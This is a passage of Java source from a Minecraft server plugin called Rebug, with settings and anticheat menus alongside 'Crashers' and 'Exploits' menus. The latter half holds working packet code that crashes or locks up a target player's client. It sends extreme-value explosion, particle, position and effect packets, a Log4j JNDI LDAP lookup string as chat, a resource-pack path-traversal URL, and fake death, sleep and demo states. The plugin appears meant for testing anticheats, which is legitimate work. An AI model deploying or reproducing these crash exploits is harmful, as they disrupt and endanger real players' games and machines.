		meta2.setDisplayName(ChatColor.RED + "Delete Item");
		tempstack2.setItemMeta(meta2);
		TempItemsInvSee.put(tempstack2, 17);
	}
	
	public void UpdateMenuValueChangeLore(Inventory inventory, int slot, int loreslot, String ChangedTo)
	{
		if (inventory == null || PT.isStringNull(ChangedTo)) return;
		
		
		ItemMeta NewMeta = inventory.getItem(slot).getItemMeta();
		List<String> NewLore = NewMeta.getLore();
		NewLore.set(loreslot, ChangedTo);
		NewMeta.setLore(NewLore);
		inventory.getItem(slot).setItemMeta(NewMeta);
	}
	public void UpdateItemInMenu (Inventory inventory, int itemslot, ItemStack NewItem)
	{
		if (inventory == null) return;
		
		inventory.setItem(itemslot, NewItem);
	}
	public void UpdateMenuLore (Inventory inventory, int itemslot, int loreslot, String text)
	{
		if (inventory == null || PT.isStringNull(text)) return;
		
		
		ItemMeta NewMeta = inventory.getItem(itemslot).getItemMeta();
		List<String> NewLore = NewMeta.getLore();
		NewLore.set(loreslot, text);
		NewMeta.setLore(NewLore);
		inventory.getItem(itemslot).setItemMeta(NewMeta);
	}
	public void UpdateItemInHandLore (int loreslot, String text)
	{
		if (this.player.getItemInHand() == null || PT.isStringNull(text)) return;
		
		
		ItemMeta NewMeta = this.player.getItemInHand().getItemMeta();
		List<String> NewLore = NewMeta.getLore();
		NewLore.set(loreslot, text);
		NewMeta.setLore(NewLore);
		this.player.getItemInHand().setItemMeta(NewMeta);
	}
	
	// Inventory Size can be: 9, 18, 27, 36, 45, 54
	private ItemStack Reset (Material material)
	{
		this.item = (ItemStack) (this.itemMeta = null);
		this.lore.clear();
		this.item = new ItemStack(material);
		this.itemMeta = this.item.getItemMeta();
		
		return this.item;
	}
	@SuppressWarnings("unused")
	private ItemStack Reset (Material material, int amount)
	{
		this.item = (ItemStack) (this.itemMeta = null);
		lore.clear();
		this.item = new ItemStack(material, amount);
		itemMeta = this.item.getItemMeta();
		
		return this.item;
	}
	@SuppressWarnings("unused")
	private ItemStack Reset (Material material, int amount, short damage)
	{
		this.item = (ItemStack) (this.itemMeta = null);
		lore.clear();
		this.item = new ItemStack(material, amount, damage);
		itemMeta = this.item.getItemMeta();
		
		return this.item;
	}
	@SuppressWarnings("deprecation")
	private ItemStack Reset (Material material, Integer amount, Short damage, Byte data)
	{
		this.item = (ItemStack) (this.itemMeta = null);
		lore.clear();
		this.item = new ItemStack(material, amount, damage, data);
		itemMeta = this.item.getItemMeta();
		
		return this.item;
	}
    public Inventory getCrashers ()
    {
    	if (CrashersMenu != null)
    	{
    		User user = Rebug.getUser(CommandTarget);
    		UpdateItemInMenu(CrashersMenu, 0, getMadeItems("%user-info%", user));
    	}
    	if (CrashersMenu == null)
    	{
    		User user = Rebug.getUser(CommandTarget);
    		Inventory inventory = OldInventory = PT.createInventory(getPlayer(), 18, ChatColor.DARK_RED + "Crashers");
    		item = getMadeItems("%user-info%", user);
			inventory.setItem(0, item);
			
			
			item = Reset(Material.CLAY);
			itemMeta.setDisplayName(ChatColor.RED + "GameState");
			lore.add("GameState Exploit!");
			lore.add("Crashes the client");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(1, item);
			
			item = Reset(Material.TNT);
			itemMeta.setDisplayName(ChatColor.RED + "Explosion");
			lore.add("Explosion Exploit!");
			lore.add("Crashes the client");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(2, item);
			
			item = Reset(Material.COMMAND);
			itemMeta.setDisplayName(ChatColor.RED + "NumbWare");
			lore.add("NumbWare Client");
			lore.add("Crasher");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(3, item);
			
			item = Reset(Material.FIREWORK);
			itemMeta.setDisplayName(ChatColor.RED + "Particle");
			lore.add("Particle Exploit!");
			lore.add("crashes the client");
			lore.add("");
			lore.add("Works on " + ChatColor.DARK_RED + "1.8.x-1.20.4");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(4, item);
			
			item = Reset(Material.COMMAND);
			itemMeta.setDisplayName(ChatColor.RED + "Log4j");
			lore.add("Log4j Exploit");
			lore.add("crashes the client");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(5, item);
			
			item = Reset(Material.PISTON_BASE);
			itemMeta.setDisplayName(ChatColor.RED + "illegal Position");
			lore.add("illegal Position Exploit!");
			lore.add("Crashes the client");
			lore.add("");
			lore.add("Works on " + ChatColor.DARK_RED + "1.8.x-1.20.4");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(6, item);
			
			item = Reset(Material.POTION);
			itemMeta.setDisplayName(ChatColor.RED + "illegal Effect");
			lore.add("illegal Effect Exploit!");
			lore.add("Crashes the client and server if there's no anticrasher!");
			lore.add("rebug will have a anticrasher at some point!");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(7, item);
			
			item = Reset(Material.DROPPER);
			itemMeta.setDisplayName(ChatColor.RED + "ResourcePack");
			lore.add("ResourcePack Exploit!");
			lore.add("Crashes the client");
			lore.add("");
			lore.add("Works on " + ChatColor.DARK_RED + "1.8.x");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(8, item);
			
			
			item = Reset(Material.BEDROCK);
			itemMeta.setDisplayName(ChatColor.RED + "Test");
			lore.add("Test Exploit");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(9, item);
			
			
			// Paged Items
			item = Reset(Material.DARK_OAK_DOOR_ITEM);
			itemMeta.setDisplayName(ChatColor.BLUE + "Spawn Entity Crashers");
			lore.add("Opens the menu");
			lore.add("Entity crashers!");
			lore.add("entity crasher is the same");
			lore.add("as illegal Data Watcher");
			lore.add("But it adds the illegal Data");
			lore.add("to a entity other than");
			lore.add("the player");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(10, item);
			
			for (int i = 0; i < inventory.getSize(); i ++)
			{
				if (inventory.getItem(i) == null)
				{
					item = Reset(Material.STAINED_GLASS_PANE, 1, (short) 0, (byte) 7);
					itemMeta.setDisplayName(" ");
					item.setItemMeta(itemMeta);
					inventory.setItem(i, item);
				}
			}
			CrashersMenu = inventory;
    	}
    	
    	return OldInventory = CrashersMenu;
    }
    public Inventory getVanillaFlyChecks ()
    {
    	if (VanillaFlyChecksMenu == null)
    	{
    		Inventory inventory = PT.createInventory(player, 9, ChatColor.BLUE + "Vanilla Fly Checks");
			item = Reset(Material.COMMAND);
			itemMeta.setDisplayName(ChatColor.RED.toString() + ChatColor.ITALIC + "Back");
			lore.add(ChatColor.AQUA + "Go back!");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(0, item);
			
			item = Reset(Material.BOOK_AND_QUILL);
			itemMeta.setDisplayName(ChatColor.ITALIC + "Notify On Flying Kick 1.8.x");
			lore.add(ChatColor.AQUA + "Status: " + (NotifyFlyingKick1_8 ? ChatColor.GREEN : ChatColor.DARK_RED) + NotifyFlyingKick1_8);
			lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable alerts");
			lore.add(ChatColor.RESET + "for you being picked up for");
			lore.add(ChatColor.RESET + "flying by vanilla 1.8.x");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(1, item);
			
			item = Reset(Material.BOOK_AND_QUILL);
			itemMeta.setDisplayName(ChatColor.ITALIC + "Notify On Flying Kick 1.9+");
			lore.add(ChatColor.AQUA + "Status: " + (NotifyFlyingKick1_9 ? ChatColor.GREEN : ChatColor.DARK_RED) + NotifyFlyingKick1_9);
			lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable alerts");
			lore.add(ChatColor.RESET + "for you being picked up for");
			lore.add(ChatColor.RESET + "flying by vanilla 1.9+");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(2, item);
			
			item = Reset(Vanilla1_8FlyCheck ? Material.BAKED_POTATO : Material.POTATO_ITEM);
			itemMeta.setDisplayName(ChatColor.ITALIC + "1.8.x");
			lore.add(ChatColor.AQUA + "Status: " + (Vanilla1_8FlyCheck ? ChatColor.GREEN : ChatColor.DARK_RED) + Vanilla1_8FlyCheck);
			lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable 1.8.x Fly check");
			lore.add(ChatColor.AQUA + "In Development!");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(3, item);
			
			item = Reset(Vanilla1_9FlyCheck ? Material.BAKED_POTATO : Material.POTATO_ITEM);
			itemMeta.setDisplayName(ChatColor.ITALIC + "1.9+");
			lore.add(ChatColor.AQUA + "Status: " + (Vanilla1_9FlyCheck ? ChatColor.GREEN : ChatColor.DARK_RED) + Vanilla1_9FlyCheck);
			lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable 1.9+ Fly check");
			lore.add(ChatColor.AQUA + "In Development!");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(4, item);
			
			
			for (int i = 0; i < inventory.getSize(); i ++)
			{
				if (inventory.getItem(i) == null)
				{
					item = Reset(Material.STAINED_GLASS_PANE, 1, (short) 0, (byte) 1);
					itemMeta.setDisplayName(ChatColor.RED + "Add more Checks as they come!");
					item.setItemMeta(itemMeta);
					inventory.setItem(i, item);
				}
			}
			VanillaFlyChecksMenu = inventory;
    	}
    	
    	return VanillaFlyChecksMenu;
    }
    public Inventory getSettings ()
    {
    	if (SettingsMenu == null)
    	{
    		Inventory inventory = PT.createInventory(player, 45, ChatColor.BLUE + "Player Settings");
			item = Reset(Material.COOKED_BEEF);
			itemMeta.setDisplayName(ChatColor.ITALIC + "Hunger");
			lore.add(ChatColor.AQUA + "Status: " + (Hunger ? ChatColor.GREEN : ChatColor.DARK_RED) + Hunger);
			lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable Hunger");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(0, item);
			
			item = Reset(Material.FEATHER);
			itemMeta.setDisplayName(ChatColor.ITALIC + "Fall Damage");
			lore.add(ChatColor.AQUA + "Status: " + (FallDamage ? ChatColor.GREEN : ChatColor.DARK_RED) + FallDamage);
			lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable Fall Damage");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(1, item);
			
			item = Reset(Material.ARROW);
			itemMeta.setDisplayName(ChatColor.ITALIC + "Exterranl Damage");
			lore.add(ChatColor.AQUA + "Status: " + (Exterranl_Damage ? ChatColor.GREEN : ChatColor.DARK_RED) + Exterranl_Damage);
			lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable Exterranl Damage");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(2, item);
			
			
			item = Reset(Material.ARMOR_STAND);
			itemMeta.setDisplayName(ChatColor.ITALIC + "Damage Resistance");
			lore.add(ChatColor.AQUA + "Status: " + (Damage_Resistance ? ChatColor.GREEN : ChatColor.DARK_RED) + Damage_Resistance);
			lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable Damage Resistance");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(3, item);
			
			
			item = Reset(Material.FIREBALL);
			itemMeta.setDisplayName(ChatColor.ITALIC + "Fire Resistance");
			lore.add(ChatColor.AQUA + "Status: " + (Fire_Resistance ? ChatColor.GREEN : ChatColor.DARK_RED) + Fire_Resistance);
			lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable Fire Resistance");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(4, item);
			
			item = Reset(Material.COMMAND);
			itemMeta.setDisplayName(ChatColor.ITALIC + "Vanilla Fly Checks");
			lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable Vanilla Fly Checks");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(5, item);
			
			item = Reset(Material.POTION);
			itemMeta.setDisplayName(ChatColor.ITALIC + "Potions");
			lore.add(ChatColor.AQUA + "Status: " + (PotionEffects ? ChatColor.GREEN : ChatColor.DARK_RED) + PotionEffects);
			lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable Potion Effects");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(6, item);
			
			item = Reset(Material.STONE);
			itemMeta.setDisplayName(ChatColor.ITALIC + "Auto Refill Blocks");
			lore.add(ChatColor.AQUA + "Status: " + (AutoRefillBlocks ? ChatColor.GREEN : ChatColor.DARK_RED) + AutoRefillBlocks);
			lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable Auto Block Refill");
			lore.add(ChatColor.RESET + "for Scaffold Test Area");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(7, item);
			
			item = Reset(Material.DISPENSER);
			itemMeta.setDisplayName(ChatColor.ITALIC + "Infinite Blocks");
			lore.add(ChatColor.AQUA + "Status: " + (Infinite_Blocks ? ChatColor.GREEN : ChatColor.DARK_RED) + Infinite_Blocks);
			lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable blocks you place being Infinite!");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(8, item);
			
			item = Reset(Material.PAPER);
			itemMeta.setDisplayName(ChatColor.ITALIC + "Allow Mentions");
			lore.add(ChatColor.AQUA + "Status: " + (AllowMentions ? ChatColor.GREEN : ChatColor.DARK_RED) + AllowMentions);
			lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Stop's you seeing other players chat messages that mention you");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(9, item);
			
			item = Reset(Material.BANNER);
			itemMeta.setDisplayName(ChatColor.ITALIC + "Flags");
			lore.add(ChatColor.AQUA + "Status: " + (ShowFlags ? ChatColor.GREEN : ChatColor.DARK_RED) + ShowFlags);
			lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Show anticheat flags");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(10, item);
			
			
			item = Reset(Material.BANNER);
			itemMeta.setDisplayName(ChatColor.ITALIC + "Punishes");
			lore.add(ChatColor.AQUA + "Status: " + (ShowPunishes ? ChatColor.GREEN : ChatColor.DARK_RED) + ShowPunishes);
			lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Show anticheat alerts for you were/would of been Punished");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(11, item);
			
			
			item = Reset(Material.BANNER);
			itemMeta.setDisplayName(ChatColor.ITALIC + "Setbacks");
			lore.add(ChatColor.AQUA + "Status: " + (ShowSetbacks ? ChatColor.GREEN : ChatColor.DARK_RED) + ShowSetbacks);
			lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Show anticheat alerts for you were/would of been Setback");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(12, item);
			
			
			item = Reset(Material.ANVIL);
			itemMeta.setDisplayName(ChatColor.ITALIC + "Kick");
			lore.add(ChatColor.AQUA + "Status: " + (AntiCheatKick ? ChatColor.GREEN : ChatColor.DARK_RED) + AntiCheatKick);
			lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable anticheat kicks");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(13, item);
			
			item = Reset(Material.EXP_BOTTLE);
			itemMeta.setDisplayName(ChatColor.ITALIC + "Hide All Online Players");
			lore.add(ChatColor.AQUA + "Status: " + (HideOnlinePlayers ? ChatColor.GREEN : ChatColor.DARK_RED) + HideOnlinePlayers);
			lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Hide/Unhide All Online Players");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(14, item);
			
			item = Reset(Material.IRON_DOOR);
			itemMeta.setDisplayName(ChatColor.ITALIC + "Proximity Player Hider");
			lore.add(ChatColor.AQUA + "Status: " + (ProximityPlayerHider ? ChatColor.GREEN : ChatColor.DARK_RED) + ProximityPlayerHider);
			lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Hide players that are near you!");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(15, item);
			
			item = Reset(Material.BOOK_AND_QUILL);
			itemMeta.setDisplayName(ChatColor.ITALIC + "Direct Messages");
			lore.add(ChatColor.AQUA + "Status: " + (AllowDirectMessages ? ChatColor.GREEN : ChatColor.DARK_RED) + AllowDirectMessages);
			lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Allow/Disallow Direct Messages");
			lore.add(ChatColor.AQUA + "In Development!");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(16, item);


			item = Reset(Material.BED);
			itemMeta.setDisplayName(ChatColor.ITALIC + "Auto Close AntiCheats Menu");
			lore.add(ChatColor.AQUA + "Status: " + (AutoCloseAntiCheatMenu ? ChatColor.GREEN : ChatColor.DARK_RED) + AutoCloseAntiCheatMenu);
			lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable Auto Closing AntiCheat Menu");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(17, item);
			
			
			item = Reset(Material.PAPER);
			itemMeta.setDisplayName(ChatColor.ITALIC + "S08 Alerts");
			lore.add(ChatColor.AQUA + "Status: " + (ShowS08Alert ? ChatColor.GREEN : ChatColor.DARK_RED) + ShowS08Alert);
			lore.add(ChatColor.AQUA + "Description: " + ChatColor.RESET + "Enable/Disable Alerts for S08");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(18, item);
			
			
			item = Reset(Material.COMMAND);
			itemMeta.setDisplayName(ChatColor.ITALIC + "Client Command Checker");
			lore.add(ChatColor.AQUA + "Status: " + (ClientCommandChecker ? ChatColor.GREEN : ChatColor.DARK_RED) + ClientCommandChecker);
			lore.add(ChatColor.AQUA + "Description: " + ChatColor.RESET + "Checks if the player is using cheats");
			lore.add(ChatColor.RESET + "by checking if they have client commands like");
			lore.add(ChatColor.RESET + ".say this is easily bypassed");
			lore.add(ChatColor.RESET + "this is done when the player first joins the server!");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(19, item);
			
			
			item = Reset(Material.TNT);
			itemMeta.setDisplayName(ChatColor.ITALIC.toString() + ChatColor.BOLD + ChatColor.RED + "REBUG " + ChatColor.RESET + ChatColor.ITALIC + ChatColor.GRAY + "Settings");
			item.setItemMeta(itemMeta);
			inventory.setItem(44, item);
			
			for (int i = 0; i < inventory.getSize(); i ++)
			{
				if (inventory.getItem(i) == null)
				{
					item = Reset(Material.STAINED_GLASS_PANE, 1, (short) 0, (byte) 7);
					itemMeta.setDisplayName(ChatColor.RED + "Add more Settings as i think of them!");
					item.setItemMeta(itemMeta);
					inventory.setItem(i, item);
				}
			}
			SettingsMenu = inventory;
    	}
    	
    	return OldInventory = SettingsMenu;
    }
    
    public Inventory getExploits ()
    {
    	if (ExploitsMenu != null)
    	{
    		User user = Rebug.getUser(CommandTarget);
    		UpdateItemInMenu(CrashersMenu, 0, getMadeItems("%user-info%", user));
    	}
    	if (ExploitsMenu == null)
    	{
    		User user = Rebug.getUser(CommandTarget);
    		Inventory inventory = PT.createInventory(player, 9, ChatColor.DARK_RED + "Exploits");
    		item = getMadeItems("%user-info%", user);
			inventory.setItem(0, item);
			
			
			item = Reset(Material.DEAD_BUSH);
			itemMeta.setDisplayName(ChatColor.RED + "Fake Death");
			lore.add("Fake Death Exploit!");
			lore.add("Makes the client");
			lore.add("think the player");
			lore.add("died but didn't");
			lore.add("and is now bugged");
			lore.add("out and can't respawn");
			lore.add("");
			lore.add("Works on " + ChatColor.DARK_RED + "1.8.x-1.20.4");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(1, item);
			
			item = Reset(Material.BED);
			itemMeta.setDisplayName(ChatColor.RED + "Force Sleep");
			lore.add("Force Sleep Exploit!");
			lore.add("works like the fake death exploit but with bed");
			lore.add("you can't get out of the bed and do anything!");
			lore.add("");
			lore.add("Works on " + ChatColor.DARK_RED + "1.8.x-1.20.4");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(2, item);
			
			item = Reset(Material.ANVIL);
			itemMeta.setDisplayName(ChatColor.RED + "Demo");
			lore.add("Demo Exploit!");
			lore.add("Makes the players game");
			lore.add("think it's a demo!");
			lore.add("");
			lore.add("Works on " + ChatColor.DARK_RED + "1.8.x-1.20.4");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(3, item);
			
			item = Reset(Material.DROPPER);
			itemMeta.setDisplayName(ChatColor.RED + "ResourcePack");
			lore.add("Test Exploit!");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(4, item);
			
			item = Reset(Material.CHEST);
			itemMeta.setDisplayName(ChatColor.RED + "Test");
			lore.add("Test Exploit!");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(5, item);
			
			item = Reset(Material.ARMOR_STAND);
			itemMeta.setDisplayName(ChatColor.RED + "Spawn Player");
			lore.add("Spawn Player Exploit!");
			lore.add("Freezes the player and stops");
			lore.add("them from being able");
			lore.add("to move!");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(6, item);
			
			
			for (int i = 0; i < inventory.getSize(); i ++)
			{
				if (inventory.getItem(i) == null)
				{
					item = Reset(Material.STAINED_GLASS_PANE, 1, (short) 0, (byte) 7);
					itemMeta.setDisplayName(" ");
					item.setItemMeta(itemMeta);
					inventory.setItem(i, item);
				}
			}
			
			ExploitsMenu = inventory;
    	}
    	
    	return ExploitsMenu;
    }
    private ItemStack Reset (ItemStack item)
	{
		this.item = (ItemStack) (this.itemMeta =  null);
		lore.clear();
		this.item = item;
		itemMeta = this.item.getItemMeta();
		
		return this.item;
	}
    
    public Inventory getSpawnEntityCrashers ()
    {
    	if (SpawnEntityCrashersMenu != null)
    	{
    		User user = Rebug.getUser(CommandTarget);
    		UpdateItemInMenu(CrashersMenu, 1, getMadeItems("%user-info%", user));
    	}
    	if (SpawnEntityCrashersMenu == null)
    	{
    		Inventory inventory = PT.createInventory(this.player, 9, ChatColor.RED + "Spawn Entity Crashers");
			item = Reset(new ItemStack(Material.WOOL, 1, (short) 14));
			itemMeta.setDisplayName(ChatColor.BLUE + "Back");
			lore.add("takes you back to the");
			lore.add("crashers menu.");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(0, item);
			
			
			User user = Rebug.getUser(CommandTarget);
    		item = getMadeItems("%user-info%", user);
			inventory.setItem(1, item);
			
			item = Reset(new ItemStack(Material.SKULL_ITEM, 1, (short) 4));
			itemMeta.setDisplayName(ChatColor.RED + "Creeper");
			lore.add("Creeper Crash Exploit!");
			lore.add("");
			lore.add("Works on " + ChatColor.DARK_RED + "1.8.x");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(2, item);
			
			item = Reset(new ItemStack(Material.MOB_SPAWNER));
			itemMeta.setDisplayName(ChatColor.RED + "Test");
			lore.add("Test Crash Exploit!");
			itemMeta.setLore(lore);
			item.setItemMeta(itemMeta);
			inventory.setItem(3, item);
			
			SpawnEntityCrashersMenu = inventory;
    	}
    	
    	return SpawnEntityCrashersMenu;
    }
 // TODO Make Crash Using ChatColor strip
 	public String NullPointerString ()
 	{
 		return null;
 	}
 	private EntityLiving entity = null;
    public void CrashPlayer (Player target, String mode)
    {
    	if (target == null || !target.isOnline()) return;
    	
    	entity = null;
    	if (mode != null && mode.length() > 0)
    	{
    		final EntityPlayer px = PT.getEntityPlayer(target);
    		if (mode.equalsIgnoreCase("creeper"))
    		{
    			entity = new EntityCreeper(px.world);
    			final DataWatcher dw = new DataWatcher((net.minecraft.server.v1_8_R3.Entity) entity);
                dw.a (18, (Object) Integer.MAX_VALUE);
                Packet<?> packet_spawn;
                packet_spawn = new PacketPlayOutSpawnEntityLiving((EntityLiving) entity);
                px.playerConnection.sendPacket(packet_spawn);
                Bukkit.getScheduler().scheduleSyncDelayedTask(Rebug.getINSTANCE(), new Runnable()
                {
                    @Override
                    public void run()
                    {
                        PacketPlayOutEntityMetadata meta = new PacketPlayOutEntityMetadata(entity.getId(), dw, true);
                        px.playerConnection.sendPacket(meta);
                    }
                }, 5L);
    		}
    		if (mode.equalsIgnoreCase("test"))
    		{
    		}
    	}
    }
 	public void CrashSendPacket (Player target, String mode, String spawncrashmode)
 	{
 		if (target == null || !target.isOnline()) 
 		{
 			sendMessage("Target was null!");
 			return;
 		}
 		sendMessage("Sending Crash...");
 		
 		if (mode.equalsIgnoreCase("Server")) // Test in dev
 		{
 			for (int i = 0; i < Integer.MAX_VALUE; i ++)
 			PT.SendPacket(target, new PacketPlayOutCollect(target.getEntityId(), Integer.MAX_VALUE));
 			sendMessage("Trying Server Crasher!");
 			return;
 		}
 		if (mode.equalsIgnoreCase("Test"))
 		{
 			IChatBaseComponent chatTitle = ChatSerializer.a("{\"text\":\"\"}");
			PacketPlayOutChat chat = new PacketPlayOutChat(chatTitle, (byte) 2);
			PT.SendPacket(target, chat);
 			sendMessage("Tried crashing " + target.getName() + " with test");
 			return;
 		}
 		if (mode.equalsIgnoreCase("NumbWare"))
 		{
 			PT.SendPacket(target, new PacketPlayOutCustomPayload("NWS|Crash Bed",
 				    new PacketDataSerializer(Unpooled.buffer())));
 		}
 		if (mode.equalsIgnoreCase("Explosion"))
 		{
             PT.SendPacket(target, new PacketPlayOutExplosion(target.getLocation().getX(), target.getLocation().getY(), target.getLocation().getZ(), Float.MAX_VALUE, new ArrayList<BlockPosition>(), new Vec3D(target.getLocation().getX(), target.getLocation().getY(), target.getLocation().getZ())));
 		}
 		if (mode.equalsIgnoreCase("Particle"))
 		{
 			float red = PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), green = PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), blue = PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE);
 			
             for (int i = 0; i < EnumParticle.values().length; i ++)
             {
                 PT.SendPacket(target, new PacketPlayOutWorldParticles(EnumParticle.a(i), true, PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), red, green, blue, PT.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), Integer.MAX_VALUE, new int[]{0}));
             }
 		}
 		if (mode.equalsIgnoreCase("GameState"))
 		{
 			PT.SendPacket(target, new PacketPlayOutGameStateChange(7, (float) (PT.nextBoolean() ? PT.randomNumber(Float.MAX_VALUE, 500) : PT.randomNumber(-Float.MAX_VALUE, -500))));
 		}
 		if (mode.equalsIgnoreCase("Log4j"))
 		{
 			String str = "\\${jndi:ldap://192.168." + PT.nextInt(1, 253) + "." + PT.nextInt(1, 253) + "}";
 			ChatComponentText text = new ChatComponentText("/tell " + PT.randomString(10) + " " + str);
 			PT.SendPacket(target, new PacketPlayOutChat (text, (byte) 1));
 		}
 		if (mode.equalsIgnoreCase("illegal Position"))
 		{
 			for (int i = 0; i < PacketPlayOutPosition.EnumPlayerTeleportFlags.values().length; i ++)
 			{
 				PT.SendPacket(target, new PacketPlayOutPosition(Double.MAX_VALUE, Double.MAX_VALUE, -Double.MAX_VALUE, Float.MAX_VALUE, -Float.MAX_VALUE, PacketPlayOutPosition.EnumPlayerTeleportFlags.a(i)));
 			}
 		}
 		if (mode.equalsIgnoreCase("illegal Effect"))
 		{
 			for (int i = 0; i < Integer.MAX_VALUE; i++)
 				PT.SendPacket(target, new PacketPlayOutEntityEffect (target.getEntityId(), new MobEffect(Integer.MAX_VALUE, Integer.MAX_VALUE, Integer.MAX_VALUE, true, true)));
 			
 		}
 		if (mode.equalsIgnoreCase("SpawnEntity"))
 		{
 			CrashPlayer(target, spawncrashmode);
 			sendMessage("Tried using the " + mode + " " + spawncrashmode + " Crash Exploit on " + target.getName());
 			return;
 		}
 		if (mode.equalsIgnoreCase("ResourcePack"))
 		{
 			PT.SendPacket(target, new PacketPlayOutResourcePackSend("a8e2cdd0a39c3737b6a6186659c2ad6b816670d2", "level://../servers.dat"));
 		}
 		sendMessage("Tried using the " + mode + " Crash Exploit on " + target.getName());
 	}
 	public void ExploitSendPacket (Player target, String exploit)
 	{
 		if (target == null || !target.isOnline()) 
 		{
 			sendMessage("Target was null!");
 			return;
 		}
 		User user = Rebug.getUser(target);
 		if (user == null) 
 		{
 			sendMessage("Failed to get User from <" + target.getName() + ">");
 			return;
 		}
 		EntityPlayer px = PT.getEntityPlayer(target);
 		if (px == null) 
 		{
 			sendMessage("Failed to get EntityPlayer <" + target.getName() + ">");
 			return;
 		}
 		sendMessage("Sending Exploit...");
 		
 		if (exploit.equalsIgnoreCase("ResourcePack"))
 		{
 			target.setResourcePack("level://../servers.dat");
 		}
 		if (exploit.equalsIgnoreCase("force sleep"))
 		{
 			PT.SendPacket(target, new PacketPlayOutBed(px, new BlockPosition(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
 		}
 		if (exploit.equalsIgnoreCase("demo"))
 		{
 			PT.SendPacket(target, new PacketPlayOutGameStateChange(5, 0));
 		}
